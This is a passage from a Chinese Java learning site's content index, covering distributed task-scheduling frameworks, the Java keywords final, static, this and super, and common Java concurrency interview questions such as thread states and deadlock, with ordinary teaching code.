地址：https://github.com/apache/shardingsphere-elasticjob。 官方网站：https://shardingsphere.apache.org/elasticjob/index_zh.html 。  优缺点总结：\n 优点 ：可以与 Spring 集成、支持分布式、支持集群、性能不错 缺点 ：依赖了额外的中间件比如 Zookeeper（复杂度增加，可靠性降低、维护成本变高）  XXL-JOB    XXL-JOB 于 2015 年开源，是一款优秀的轻量级分布式任务调度框架，支持任务可视化管理、弹性扩容缩容、任务失败重试和告警、任务分片等功能，\n根据 XXL-JOB 官网介绍，其解决了很多 Quartz 的不足。\nXXL-JOB 的架构设计如下图所示：\n从上图可以看出，XXL-JOB 由 调度中心 和 执行器 两大部分组成。调度中心主要负责任务管理、执行器管理以及日志管理。执行器主要是接收调度信号并处理。另外，调度中心进行任务调度时，是通过自研 RPC 来实现的。\n不同于 Elastic-Job 的去中心化设计， XXL-JOB 的这种设计也被称为中心化设计（调度中心调度多个执行器执行任务）。\n和 Quzrtz 类似 XXL-JOB 也是基于数据库锁调度任务，存在性能瓶颈。不过，一般在任务量不是特别大的情况下，没有什么影响的，可以满足绝大部分公司的要求。\n不要被 XXL-JOB 的架构图给吓着了，实际上，我们要用 XXL-JOB 的话，只需要重写 IJobHandler 自定义任务执行逻辑就可以了，非常易用！\n@JobHandler(value=\u0026#34;myApiJobHandler\u0026#34;) @Component public class MyApiJobHandler extends IJobHandler { @Override public ReturnT\u0026lt;String\u0026gt; execute(String param) throws Exception { //......  return ReturnT.SUCCESS; } } 还可以直接基于注解定义任务。\n@XxlJob(\u0026#34;myAnnotationJobHandler\u0026#34;) public ReturnT\u0026lt;String\u0026gt; myAnnotationJobHandler(String param) throws Exception { //......  return ReturnT.SUCCESS; } 相关地址：\n Github 地址：https://github.com/xuxueli/xxl-job/。 官方介绍：https://www.xuxueli.com/xxl-job/ 。  优缺点总结：\n 优点：开箱即用（学习成本比较低）、与 Spring 集成、支持分布式、支持集群、内置了 UI 管理控制台。 缺点：不支持动态添加任务（如果一定想要动态创建任务也是支持的，参见：xxl-job issue277）。  PowerJob    非常值得关注的一个分布式任务调度框架，分布式任务调度领域的新星。目前，已经有很多公司接入比如 OPPO、京东、中通、思科。\n这个框架的诞生也挺有意思的，PowerJob 的作者当时在阿里巴巴实习过，阿里巴巴那会使用的是内部自研的 SchedulerX（阿里云付费产品）。实习期满之后，PowerJob 的作者离开了阿里巴巴。想着说自研一个 SchedulerX，防止哪天 SchedulerX 满足不了需求，于是 PowerJob 就诞生了。\n更多关于 PowerJob 的故事，小伙伴们可以去看看 PowerJob 作者的视频 《我和我的任务调度中间件》。简单点概括就是：“游戏没啥意思了，我要扛起了新一代分布式任务调度与计算框架的大旗！”。\n由于 SchedulerX 属于人民币产品，我这里就不过多介绍。PowerJob 官方也对比过其和 QuartZ、XXL-JOB 以及 SchedulerX。\n总结    这篇文章中，我主要介绍了：\n 定时任务的相关概念 ：为什么需要定时任务、定时任务中的核心角色、分布式定时任务。 定时任务的技术选型 ： XXL-JOB 2015 年推出，已经经过了很多年的考验。XXL-JOB 轻量级，并且使用起来非常简单。虽然存在性能瓶颈，但是，在绝大多数情况下，对于企业的基本需求来说是没有影响的。PowerJob 属于分布式任务调度领域里的新星，其稳定性还有待继续考察。ElasticJob 由于在架构设计上是基于 Zookeeper ，而 XXL-JOB 是基于数据库，性能方面的话，ElasticJob 略胜一筹。  这篇文章并没有介绍到实际使用，但是，并不代表实际使用不重要。我在写这篇文章之前，已经动手写过相应的 Demo。像 Quartz，我在大学那会就用过。不过，当时用的是 Spring 。为了能够更好地体验，我自己又在 Spring Boot 上实际体验了一下。如果你并没有实际使用某个框架，就直接说它并不好用的话，是站不住脚的。\n最后，这篇文章要感谢艿艿的帮助，写这篇文章的时候向艿艿询问过一些问题。推荐一篇艿艿写的偏实战类型的硬核文章：《Spring Job？Quartz？XXL-Job？年轻人才做选择，艿艿全莽~》 。\n"},{"id":227,"href":"/java/basis/Java%E5%B8%B8%E8%A7%81%E5%85%B3%E9%94%AE%E5%AD%97%E6%80%BB%E7%BB%93/","title":"Java常见关键字总结","parent":"basis","content":" final,static,this,super 关键字总结  final 关键字 static 关键字 this 关键字 super 关键字 参考   static 关键字详解  static 关键字主要有以下四种使用场景  修饰成员变量和成员方法(常用) 静态代码块 静态内部类 静态导包   补充内容  静态方法与非静态方法 static{}静态代码块与{}非静态代码块(构造代码块) 参考      final,static,this,super 关键字总结    final 关键字    final 关键字，意思是最终的、不可修改的，最见不得变化 ，用来修饰类、方法和变量，具有以下特点：\n  final 修饰的类不能被继承，final 类中的所有成员方法都会被隐式的指定为 final 方法；\n  final 修饰的方法不能被重写；\n  final 修饰的变量是常量，如果是基本数据类型的变量，则其数值一旦在初始化之后便不能更改；如果是引用类型的变量，则在对其初始化之后便不能让其指向另一个对象。\n  说明：使用 final 方法的原因有两个。第一个原因是把方法锁定，以防任何继承类修改它的含义；第二个原因是效率。在早期的 Java 实现版本中，会将 final 方法转为内嵌调用。但是如果方法过于庞大，可能看不到内嵌调用带来的任何性能提升（现在的 Java 版本已经不需要使用 final 方法进行这些优化了）。类中所有的 private 方法都隐式地指定为 final。\nstatic 关键字    static 关键字主要有以下四种使用场景：\n 修饰成员变量和成员方法: 被 static 修饰的成员属于类，不属于单个这个类的某个对象，被类中所有对象共享，可以并且建议通过类名调用。被 static 声明的成员变量属于静态成员变量，静态变量 存放在 Java 内存区域的方法区。调用格式：类名.静态变量名 类名.静态方法名() 静态代码块: 静态代码块定义在类中方法外, 静态代码块在非静态代码块之前执行(静态代码块—\u0026gt;非静态代码块—\u0026gt;构造方法)。 该类不管创建多少对象，静态代码块只执行一次. 静态内部类（static 修饰类的话只能修饰内部类）： 静态内部类与非静态内部类之间存在一个最大的区别: 非静态内部类在编译完成之后会隐含地保存着一个引用，该引用是指向创建它的外围类，但是静态内部类却没有。没有这个引用就意味着：1. 它的创建是不需要依赖外围类的创建。2. 它不能使用任何外围类的非 static 成员变量和方法。 静态导包(用来导入类中的静态资源，1.5 之后的新特性): 格式为：import static 这两个关键字连用可以指定导入某个类中的指定静态资源，并且不需要使用类名调用类中静态成员，可以直接使用类中静态成员变量和成员方法。  this 关键字    this 关键字用于引用类的当前实例。 例如：\nclass Manager { Employees[] employees; void manageEmployees() { int totalEmp = this.employees.length; System.out.println(\u0026#34;Total employees: \u0026#34; + totalEmp); this.report(); } void report() { } } 在上面的示例中，this 关键字用于两个地方：\n this.employees.length：访问类 Manager 的当前实例的变量。 this.report（）：调用类 Manager 的当前实例的方法。  此关键字是可选的，这意味着如果上面的示例在不使用此关键字的情况下表现相同。 但是，使用此关键字可能会使代码更易读或易懂。\nsuper 关键字    super 关键字用于从子类访问父类的变量和方法。 例如：\npublic class Super { protected int number; protected showNumber() { System.out.println(\u0026#34;number = \u0026#34; + number); } } public class Sub extends Super { void bar() { super.number = 10; super.showNumber(); } } 在上面的例子中，Sub 类访问父类成员变量 number 并调用其父类 Super 的 showNumber（） 方法。\n使用 this 和 super 要注意的问题：\n 在构造器中使用 super() 调用父类中的其他构造方法时，该语句必须处于构造器的首行，否则编译器会报错。另外，this 调用本类中的其他构造方法时，也要放在首行。 this、super 不能用在 static 方法中。  简单解释一下：\n被 static 修饰的成员属于类，不属于单个这个类的某个对象，被类中所有对象共享。而 this 代表对本类对象的引用，指向本类对象；而 super 代表对父类对象的引用，指向父类对象；所以， this 和 super 是属于对象范畴的东西，而静态方法是属于类范畴的东西。\n参考     https://www.codejava.net/java-core/the-java-language/java-keywords https://blog.csdn.net/u013393958/article/details/79881037  static 关键字详解    static 关键字主要有以下四种使用场景     修饰成员变量和成员方法 静态代码块 修饰类(只能修饰内部类) 静态导包(用来导入类中的静态资源，1.5 之后的新特性)  修饰成员变量和成员方法(常用)    被 static 修饰的成员属于类，不属于单个这个类的某个对象，被类中所有对象共享，可以并且建议通过类名调用。被 static 声明的成员变量属于静态成员变量，静态变量 存放在 Java 内存区域的方法区。\n方法区与 Java 堆一样，是各个线程共享的内存区域，它用于存储已被虚拟机加载的类信息、常量、静态变量、即时编译器编译后的代码等数据。虽然 Java 虚拟机规范把方法区描述为堆的一个逻辑部分，但是它却有一个别名叫做 Non-Heap（非堆），目的应该是与 Java 堆区分开来。\nHotSpot 虚拟机中方法区也常被称为 “永久代”，本质上两者并不等价。仅仅是因为 HotSpot 虚拟机设计团队用永久代来实现方法区而已，这样 HotSpot 虚拟机的垃圾收集器就可以像管理 Java 堆一样管理这部分内存了。但是这并不是一个好主意，因为这样更容易遇到内存溢出问题。\n调用格式：\n 类名.静态变量名 类名.静态方法名()  如果变量或者方法被 private 则代表该属性或者该方法只能在类的内部被访问而不能在类的外部被访问。\n测试方法：\npublic class StaticBean { String name; //静态变量  static int age; public StaticBean(String name) { this.name = name; } //静态方法  static void sayHello() { System.out.println(\u0026#34;Hello i am java\u0026#34;); } @Override public String toString() { return \u0026#34;StaticBean{\u0026#34;+ \u0026#34;name=\u0026#34; + name + \u0026#34;,age=\u0026#34; + age + \u0026#34;}\u0026#34;; } } public class StaticDemo { public static void main(String[] args) { StaticBean staticBean = new StaticBean(\u0026#34;1\u0026#34;); StaticBean staticBean2 = new StaticBean(\u0026#34;2\u0026#34;); StaticBean staticBean3 = new StaticBean(\u0026#34;3\u0026#34;); StaticBean staticBean4 = new StaticBean(\u0026#34;4\u0026#34;); StaticBean.age = 33; System.out.println(staticBean + \u0026#34; \u0026#34; + staticBean2 + \u0026#34; \u0026#34; + staticBean3 + \u0026#34; \u0026#34; + staticBean4); //StaticBean{name=1,age=33} StaticBean{name=2,age=33} StaticBean{name=3,age=33} StaticBean{name=4,age=33}  StaticBean.sayHello();//Hello i am java  } } 静态代码块    静态代码块定义在类中方法外, 静态代码块在非静态代码块之前执行(静态代码块 —\u0026gt; 非静态代码块 —\u0026gt; 构造方法)。 该类不管创建多少对象，静态代码块只执行一次.\n静态代码块的格式是\nstatic { 语句体; } 一个类中的静态代码块可以有多个，位置可以随便放，它不在任何的方法体内，JVM 加载类时会执行这些静态的代码块，如果静态代码块有多个，JVM 将按照它们在类中出现的先后顺序依次执行它们，每个代码块只会被执行一次。\n静态代码块对于定义在它之后的静态变量，可以赋值，但是不能访问.\n静态内部类    静态内部类与非静态内部类之间存在一个最大的区别，我们知道非静态内部类在编译完成之后会隐含地保存着一个引用，该引用是指向创建它的外围类，但是静态内部类却没有。没有这个引用就意味着：\n 它的创建是不需要依赖外围类的创建。 它不能使用任何外围类的非 static 成员变量和方法。  Example（静态内部类实现单例模式）\npublic class Singleton { //声明为 private 避免调用默认构造方法创建对象  private Singleton() { } // 声明为 private 表明静态内部该类只能在该 Singleton 类中被访问  private static class SingletonHolder { private static final Singleton INSTANCE = new Singleton(); } public static Singleton getUniqueInstance() { return SingletonHolder.INSTANCE; } } 当 Singleton 类加载时，静态内部类 SingletonHolder 没有被加载进内存。只有当调用 getUniqueInstance()方法从而触发 SingletonHolder.INSTANCE 时 SingletonHolder 才会被加载，此时初始化 INSTANCE 实例，并且 JVM 能确保 INSTANCE 只被实例化一次。\n这种方式不仅具有延迟初始化的好处，而且由 JVM 提供了对线程安全的支持。\n静态导包    格式为：import static\n这两个关键字连用可以指定导入某个类中的指定静态资源，并且不需要使用类名调用类中静态成员，可以直接使用类中静态成员变量和成员方法\n//将Math中的所有静态资源导入，这时候可以直接使用里面的静态方法，而不用通过类名进行调用  //如果只想导入单一某个静态方法，只需要将*换成对应的方法名即可  import static java.lang.Math.*;//换成import static java.lang.Math.max;具有一样的效果  public class Demo { public static void main(String[] args) { int max = max(1,2); System.out.println(max); } } 补充内容    静态方法与非静态方法    静态方法属于类本身，非静态方法属于从该类生成的每个对象。 如果您的方法执行的操作不依赖于其类的各个变量和方法，请将其设置为静态（这将使程序的占用空间更小）。 否则，它应该是非静态的。\nExample\nclass Foo { int i; public Foo(int i) { this.i = i; } public static String method1() { return \u0026#34;An example string that doesn\u0026#39;t depend on i (an instance variable)\u0026#34;; } public int method2() { return this.i + 1; //Depends on i  } } 你可以像这样调用静态方法：Foo.method1()。 如果您尝试使用这种方法调用 method2 将失败。 但这样可行\nFoo bar = new Foo(1); bar.method2(); 总结：\n 在外部调用静态方法时，可以使用”类名.方法名”的方式，也可以使用”对象名.方法名”的方式。而实例方法只有后面这种方式。也就是说，调用静态方法可以无需创建对象。 静态方法在访问本类的成员时，只允许访问静态成员（即静态成员变量和静态方法），而不允许访问实例成员变量和实例方法；实例方法则无此限制  static{}静态代码块与{}非静态代码块(构造代码块)    相同点： 都是在 JVM 加载类时且在构造方法执行之前执行，在类中都可以定义多个，定义多个时按定义的顺序执行，一般在代码块中对一些 static 变量进行赋值。\n不同点： 静态代码块在非静态代码块之前执行(静态代码块 -\u0026gt; 非静态代码块 -\u0026gt; 构造方法)。静态代码块只在第一次 new 执行一次，之后不再执行，而非静态代码块在每 new 一次就执行一次。 非静态代码块可在普通方法中定义(不过作用不大)；而静态代码块不行。\n 🐛 修正（参见： issue #677） ：静态代码块可能在第一次 new 对象的时候执行，但不一定只在第一次 new 的时候执行。比如通过 Class.forName(\u0026quot;ClassDemo\u0026quot;)创建 Class 对象的时候也会执行，即 new 或者 Class.forName(\u0026quot;ClassDemo\u0026quot;) 都会执行静态代码块。\n 一般情况下,如果有些代码比如一些项目最常用的变量或对象必须在项目启动的时候就执行的时候,需要使用静态代码块,这种代码是主动执行的。如果我们想要设计不需要创建对象就可以调用类中的方法，例如：Arrays 类，Character 类，String 类等，就需要使用静态方法, 两者的区别是 静态代码块是自动执行的而静态方法是被调用的时候才执行的.\nExample：\npublic class Test { public Test() { System.out.print(\u0026#34;默认构造方法！--\u0026#34;); } //非静态代码块  { System.out.print(\u0026#34;非静态代码块！--\u0026#34;); } //静态代码块  static { System.out.print(\u0026#34;静态代码块！--\u0026#34;); } private static void test() { System.out.print(\u0026#34;静态方法中的内容! --\u0026#34;); { System.out.print(\u0026#34;静态方法中的代码块！--\u0026#34;); } } public static void main(String[] args) { Test test = new Test(); Test.test();//静态代码块！--静态方法中的内容! --静态方法中的代码块！--  } } 上述代码输出：\n静态代码块！--非静态代码块！--默认构造方法！--静态方法中的内容! --静态方法中的代码块！-- 当只执行 Test.test(); 时输出：\n静态代码块！--静态方法中的内容! --静态方法中的代码块！-- 当只执行 Test test = new Test(); 时输出：\n静态代码块！--非静态代码块！--默认构造方法！-- 非静态代码块与构造函数的区别是： 非静态代码块是给所有对象进行统一初始化，而构造函数是给对应的对象初始化，因为构造函数是可以多个的，运行哪个构造函数就会建立什么样的对象，但无论建立哪个对象，都会先执行相同的构造代码块。也就是说，构造代码块中定义的是不同对象共性的初始化内容。\n参考     https://blog.csdn.net/chen13579867831/article/details/78995480 https://www.cnblogs.com/chenssy/p/3388487.html https://www.cnblogs.com/Qian123/p/5713440.html  "},{"id":228,"href":"/java/multi-thread/Java%E5%B9%B6%E5%8F%91%E5%9F%BA%E7%A1%80%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98%E6%80%BB%E7%BB%93/","title":"Java并发基础常见面试题总结","parent":"multi-thread","content":" Java 并发基础常见面试题总结  1. 什么是线程和进程?  1.1. 何为进程? 1.2. 何为线程?   2. 请简要描述线程与进程的关系,区别及优缺点？  2.1. 图解进程和线程的关系 2.2. 程序计数器为什么是私有的? 2.3. 虚拟机栈和本地方法栈为什么是私有的? 2.4. 一句话简单了解堆和方法区   3. 说说并发与并行的区别? 4. 为什么要使用多线程呢? 5. 使用多线程可能带来什么问题? 6. 说说线程的生命周期和状态? 7. 什么是上下文切换? 8. 什么是线程死锁?如何避免死锁?  8.1. 认识线程死锁 8.2. 如何避免线程死锁?   9. 说说 sleep() 方法和 wait() 方法区别和共同点? 10. 为什么我们调用 start() 方法时会执行 run() 方法，为什么我们不能直接调用 run() 方法？ 公众号    Java 并发基础常见面试题总结    1. 什么是线程和进程?    1.1. 何为进程?    进程是程序的一次执行过程，是系统运行程序的基本单位，因此进程是动态的。系统运行一个程序即是一个进程从创建，运行到消亡的过程。\n在 Java 中，当我们启动 main 函数时其实就是启动了一个 JVM 的进程，而 main 函数所在的线程就是这个进程中的一个线程，也称主线程。\n如下图所示，在 windows 中通过查看任务管理器的方式，我们就可以清楚看到 window 当前运行的进程（.exe 文件的运行）。\n1.2. 何为线程?    线程与进程相似，但线程是一个比进程更小的执行单位。一个进程在其执行的过程中可以产生多个线程。与进程不同的是同类的多个线程共享进程的堆和方法区资源，但每个线程有自己的程序计数器、虚拟机栈和本地方法栈，所以系统在产生一个线程，或是在各个线程之间作切换工作时，负担要比进程小得多，也正因为如此，线程也被称为轻量级进程。\nJava 程序天生就是多线程程序，我们可以通过 JMX 来看一下一个普通的 Java 程序有哪些线程，代码如下。\npublic class MultiThread { public static void main(String[] args) { // 获取 Java 线程管理 MXBean \tThreadMXBean threadMXBean = ManagementFactory.getThreadMXBean(); // 不需要获取同步的 monitor 和 synchronizer 信息，仅获取线程和线程堆栈信息 \tThreadInfo[] threadInfos = threadMXBean.dumpAllThreads(false, false); // 遍历线程信息，仅打印线程 ID 和线程名称信息 \tfor (ThreadInfo threadInfo : threadInfos) { System.out.println(\u0026#34;[\u0026#34; + threadInfo.getThreadId() + \u0026#34;] \u0026#34; + threadInfo.getThreadName()); } } } 上述程序输出如下（输出内容可能不同，不用太纠结下面每个线程的作用，只用知道 main 线程执行 main 方法即可）：\n[5] Attach Listener //添加事件 [4] Signal Dispatcher // 分发处理给 JVM 信号的线程 [3] Finalizer //调用对象 finalize 方法的线程 [2] Reference Handler //清除 reference 线程 [1] main //main 线程,程序入口 从上面的输出内容可以看出：一个 Java 程序的运行是 main 线程和多个其他线程同时运行。\n2. 请简要描述线程与进程的关系,区别及优缺点？    从 JVM 角度说进程和线程之间的关系\n2.1. 图解进程和线程的关系    下图是 Java 内存区域，通过下图我们从 JVM 的角度来说一下线程和进程之间的关系。如果你对 Java 内存区域 (运行时数据区) 这部分知识不太了解的话可以阅读一下这篇文章：《可能是把 Java 内存区域讲的最清楚的一篇文章》\n 从上图可以看出：一个进程中可以有多个线程，多个线程共享进程的堆和方法区 (JDK1.8 之后的元空间)资源，但是每个线程有自己的程序计数器、虚拟机栈 和 本地方法栈。\n总结： 线程是进程划分成的更小的运行单位。线程和进程最大的不同在于基本上各进程是独立的，而各线程则不一定，因为同一进程中的线程极有可能会相互影响。线程执行开销小，但不利于资源的管理和保护；而进程正相反。\n下面是该知识点的扩展内容！\n下面来思考这样一个问题：为什么程序计数器、虚拟机栈和本地方法栈是线程私有的呢？为什么堆和方法区是线程共享的呢？\n2.2. 程序计数器为什么是私有的?    程序计数器主要有下面两个作用：\n 字节码解释器通过改变程序计数器来依次读取指令，从而实现代码的流程控制，如：顺序执行、选择、循环、异常处理。 在多线程的情况下，程序计数器用于记录当前线程执行的位置，从而当线程被切换回来的时候能够知道该线程上次运行到哪儿了。  需要注意的是，如果执行的是 native 方法，那么程序计数器记录的是 undefined 地址，只有执行的是 Java 代码时程序计数器记录的才是下一条指令的地址。\n所以，程序计数器私有主要是为了线程切换后能恢复到正确的执行位置。\n2.3. 虚拟机栈和本地方法栈为什么是私有的?     虚拟机栈： 每个 Java 方法在执行的同时会创建一个栈帧用于存储局部变量表、操作数栈、常量池引用等信息。从方法调用直至执行完成的过程，就对应着一个栈帧在 Java 虚拟机栈中入栈和出栈的过程。 本地方法栈： 和虚拟机栈所发挥的作用非常相似，区别是： 虚拟机栈为虚拟机执行 Java 方法 （也就是字节码）服务，而本地方法栈则为虚拟机使用到的 Native 方法服务。 在 HotSpot 虚拟机中和 Java 虚拟机栈合二为一。  所以，为了保证线程中的局部变量不被别的线程访问到，虚拟机栈和本地方法栈是线程私有的。\n2.4. 一句话简单了解堆和方法区    堆和方法区是所有线程共享的资源，其中堆是进程中最大的一块内存，主要用于存放新创建的对象 (几乎所有对象都在这里分配内存)，方法区主要用于存放已被加载的类信息、常量、静态变量、即时编译器编译后的代码等数据。\n3. 说说并发与并行的区别?     并发： 同一时间段，多个任务都在执行 (单位时间内不一定同时执行)； 并行： 单位时间内，多个任务同时执行。  4. 为什么要使用多线程呢?    先从总体上来说：\n 从计算机底层来说： 线程可以比作是轻量级的进程，是程序执行的最小单位,线程间的切换和调度的成本远远小于进程。另外，多核 CPU 时代意味着多个线程可以同时运行，这减少了线程上下文切换的开销。 从当代互联网发展趋势来说： 现在的系统动不动就要求百万级甚至千万级的并发量，而多线程并发编程正是开发高并发系统的基础，利用好多线程机制可以大大提高系统整体的并发能力以及性能。  再深入到计算机底层来探讨：\n 单核时代： 在单核时代多线程主要是为了提高单进程利用 CPU 和 IO 系统的效率。 假设只运行了一个 Java 进程的情况，当我们请求 IO 的时候，如果 Java 进程中只有一个线程，此线程被 IO 阻塞则整个进程被阻塞。CPU 和 IO 设备只有一个在运行，那么可以简单地说系统整体效率只有 50%。当使用多线程的时候，一个线程被 IO 阻塞，其他线程还可以继续使用 CPU。从而提高了 Java 进程利用系统资源的整体效率。 多核时代: 多核时代多线程主要是为了提高进程利用多核 CPU 的能力。举个例子：假如我们要计算一个复杂的任务，我们只用一个线程的话，不论系统有几个 CPU 核心，都只会有一个 CPU 核心被利用到。而创建多个线程，这些线程可以被映射到底层多个 CPU 上执行，在任务中的多个线程没有资源竞争的情况下，任务执行的效率会有显著性的提高，约等于（单核时执行时间/CPU 核心数）。  5. 使用多线程可能带来什么问题?    并发编程的目的就是为了能提高程序的执行效率提高程序运行速度，但是并发编程并不总是能提高程序运行速度的，而且并发编程可能会遇到很多问题，比如：内存泄漏、死锁、线程不安全等等。\n6. 说说线程的生命周期和状态?    Java 线程在运行的生命周期中的指定时刻只可能处于下面 6 种不同状态的其中一个状态（图源《Java 并发编程艺术》4.1.4 节）。\n线程在生命周期中并不是固定处于某一个状态而是随着代码的执行在不同状态之间切换。Java 线程状态变迁如下图所示（图源《Java 并发编程艺术》4.1.4 节）：\n 订正(来自issue736)：原图中 wait 到 runnable 状态的转换中，join实际上是Thread类的方法，但这里写成了Object。\n 由上图可以看出：线程创建之后它将处于 NEW（新建） 状态，调用 start() 方法后开始运行，线程这时候处于 READY（可运行） 状态。可运行状态的线程获得了 CPU 时间片（timeslice）后就处于 RUNNING（运行） 状态。\n 在操作系统中层面线程有 READY 和 RUNNING 状态，而在 JVM 层面只能看到 RUNNABLE 状态（图源：HowToDoInJava：Java Thread Life Cycle and Thread States），所以 Java 系统一般将这两个状态统称为 RUNNABLE（运行中） 状态 。\n为什么 JVM 没有区分这两种状态呢？ （摘自：java线程运行怎么有第六种状态？ - Dawell的回答 ） 现在的时分（time-sharing）多任务（multi-task）操作系统架构通常都是用所谓的“时间分片（time quantum or time slice）”方式进行抢占式（preemptive）轮转调度（round-robin式）。这个时间分片通常是很小的，一个线程一次最多只能在 CPU 上运行比如 10-20ms 的时间（此时处于 running 状态），也即大概只有 0.01 秒这一量级，时间片用后就要被切换下来放入调度队列的末尾等待再次调度。（也即回到 ready 状态）。线程切换的如此之快，区分这两种状态就没什么意义了。\n 当线程执行 wait()方法之后，线程进入 WAITING（等待） 状态。进入等待状态的线程需要依靠其他线程的通知才能够返回到运行状态，而 TIMED_WAITING(超时等待) 状态相当于在等待状态的基础上增加了超时限制，比如通过 sleep（long millis）方法或 wait（long millis）方法可以将 Java 线程置于 TIMED_WAITING 状态。当超时时间到达后 Java 线程将会返回到 RUNNABLE 状态。当线程调用同步方法时，在没有获取到锁的情况下，线程将会进入到 BLOCKED（阻塞） 状态。线程在执行 Runnable 的run()方法之后将会进入到 TERMINATED（终止） 状态。\n相关阅读：挑错 |《Java 并发编程的艺术》中关于线程状态的三处错误 。\n7. 什么是上下文切换?    线程在执行过程中会有自己的运行条件和状态（也称上下文），比如上文所说到过的程序计数器，栈信息等。当出现如下情况的时候，线程会从占用 CPU 状态中退出。\n 主动让出 CPU，比如调用了 sleep(), wait() 等。 时间片用完，因为操作系统要防止一个线程或者进程长时间占用CPU导致其他线程或者进程饿死。 调用了阻塞类型的系统中断，比如请求 IO，线程被阻塞。 被终止或结束运行  这其中前三种都会发生线程切换，线程切换意味着需要保存当前线程的上下文，留待线程下次占用 CPU 的时候恢复现场。并加载下一个将要占用 CPU 的线程上下文。这就是所谓的 上下文切换。\n上下文切换是现代操作系统的基本功能，因其每次需要保存信息恢复信息，这将会占用 CPU，内存等系统资源进行处理，也就意味着效率会有一定损耗，如果频繁切换就会造成整体效率低下。\n8. 什么是线程死锁?如何避免死锁?    8.1. 认识线程死锁    线程死锁描述的是这样一种情况：多个线程同时被阻塞，它们中的一个或者全部都在等待某个资源被释放。由于线程被无限期地阻塞，因此程序不可能正常终止。\n如下图所示，线程 A 持有资源 2，线程 B 持有资源 1，他们同时都想申请对方的资源，所以这两个线程就会互相等待而进入死锁状态。\n下面通过一个例子来说明线程死锁,代码模拟了上图的死锁的情况 (代码来源于《并发编程之美》)：\npublic class DeadLockDemo { private static Object resource1 = new Object();//资源 1  private static Object resource2 = new Object();//资源 2  public static void main(String[] args) { new Thread(() -\u0026gt; { synchronized (resource1) { System.out.println(Thread.currentThread() + \u0026#34;get resource1\u0026#34;); try { Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(Thread.currentThread() + \u0026#34;waiting get resource2\u0026#34;); synchronized (resource2) { System.out.println(Thread.currentThread() + \u0026#34;get resource2\u0026#34;); } } }, \u0026#34;线程 1\u0026#34;).start(); new Thread(() -\u0026gt; { synchronized (resource2) { System.out.println(Thread.currentThread() + \u0026#34;get resource2\u0026#34;); try { Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(Thread.currentThread() + \u0026#34;waiting get resource1\u0026#34;); synchronized (resource1) { System.out.println(Thread.currentThread() + \u0026#34;get resource1\u0026#34;); } } }, \u0026#34;线程 2\u0026#34;).start(); } } Output\nThread[线程 1,5,main]get resource1 Thread[线程 2,5,main]get resource2 Thread[线程 1,5,main]waiting get resource2 Thread[线程 2,5,main]waiting get resource1 线程 A 通过 synchronized (resource1) 获得 resource1 的监视器锁，然后通过Thread.sleep(1000);让线程 A 休眠 1s 为的是让线程 B 得到执行然后获取到 resource2 的监视器锁。线程 A 和线程 B 休眠结束了都开始企图请求获取对方的资源，然后这两个线程就会陷入互相等待的状态，这也就产生了死锁。上面的例子符合产生死锁的四个必要条件。\n学过操作系统的朋友都知道产生死锁必须具备以下四个条件：\n 互斥条件：该资源任意一个时刻只由一个线程占用。 请求与保持条件：一个进程因请求资源而阻塞时，对已获得的资源保持不放。 不剥夺条件:线程已获得的资源在未使用完之前不能被其他线程强行剥夺，只有自己使用完毕后才释放资源。 循环等待条件:若干进程之间形成一种头尾相接的循环等待资源关系。  8.2. 如何预防和避免线程死锁?    如何预防死锁？ 破坏死锁的产生的必要条件即可：\n 破坏请求与保持条件 ：一次性申请所有的资源。 破坏不剥夺条件 ：占用部分资源的线程进一步申请其他资源时，如果申请不到，可以主动释放它占有的资源。 破坏循环等待条件 ：靠按序申请资源来预防。按某一顺序申请资源，释放资源则反序释放。破坏循环等待条件。  如何避免死锁？\n避免死锁就是在资源分配时，借助于算法（比如银行家算法）对资源分配进行计算评估，使其进入安全状态。\n安全状态 指的是系统能够按照某种进程推进顺序（P1、P2、P3\u0026hellip;..Pn）来为每个进程分配所需资源，直到满足每个进程对资源的最大需求，使每个进程都可顺利完成。称\u0026lt;P1、P2、P3\u0026hellip;..Pn\u0026gt;序列为安全序列。\n我们对线程 2 的代码修改成下面这样就不会产生死锁了。\nnew Thread(() -\u0026gt; { synchronized (resource1) { System.out.println(Thread.currentThread() + \u0026#34;get resource1\u0026#34;); try { Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(Thread.currentThread() + \u0026#34;waiting get resource2\u0026#34;); synchronized (resource2) { System.out.println(Thread.currentThread() + \u0026#34;get resource2\u0026#34;); } } }, \u0026#34;线程 2\u0026#34;).start(); Output\nThread[线程 1,5,main]get resource1 Thread[线程 1,5,main]waiting get resource2 Thread[线程 1,5,main]get resource2 Thread[线程 2,5,main]get resource1 Thread[线程 2,5,main]waiting get resource2 Thread[线程 2,5,main]get resource2 Process finished with exit code 0 我们分析一下上面的代码为什么避免了死锁的发生?\n线程 1 首先获得到 resource1 的监视器锁,这时候线程 2 就获取不到了。然后线程 1 再去获取 resource2 的监视器锁，可以获取到。然后线程 1 释放了对 resource1、resource2 的监视器锁的占用，线程 2 获取到就可以执行了。这样就破坏了破坏循环等待条件，因此避免了死锁。\n9. 说说 sleep() 方法和 wait() 方法区别和共同点?     两者最主要的区别在于：sleep() 方法没有释放锁，而 wait() 方法释放了锁 。 两者都可以暂停线程的执行。 wait() 通常被用于线程间交互/通信，sleep() 通常被用于暂停执行。 wait() 方法被调用后，线程不会自动苏醒，需要别的线程调用同一个对象上的 notify() 或者 notifyAll() 方法。sleep() 方法执行完成后，线程会自动苏醒。或者可以使用 wait(long timeout) 超时后线程会自动苏醒。  10. 为什么我们调用 start() 方法时会执行 run() 方法，为什么我们不能直接调用 run() 方法？    这是另一个非常经典的 Java 多线程面试问题，而且在面试中会经常被问到。很简单，但是很多人都会答不上来！\nnew 一个 Thread，线程进入了新建状态。调用 start()方法，会启动一个线程并使线程进入了就绪状态，当分配到时间片后就可以开始运行了。 start() 会执行线程的相应准备工作，然后自动执行 run() 方法的内容，这是真正的多线程工作。 但是，直接执行 run() 方法，会把 run() 方法当成一个 main 线程下的普通方法去执行，并不会在某个线程中执行它，所以这并不是多线程工作。\n总结： 调用 start() 方法方可启动线程并使线程进入就绪状态，直接执行 run() 方法的话不会以多线程的方式执行。\n公众号    如果大家想要实时关注我更新的文章以及分享的干货的话，可以关注我的公众号。\n《Java 面试突击》: 由本文档衍生的专为面试而生的《Java 面试突击》V2.0 PDF 版本公众号后台回复 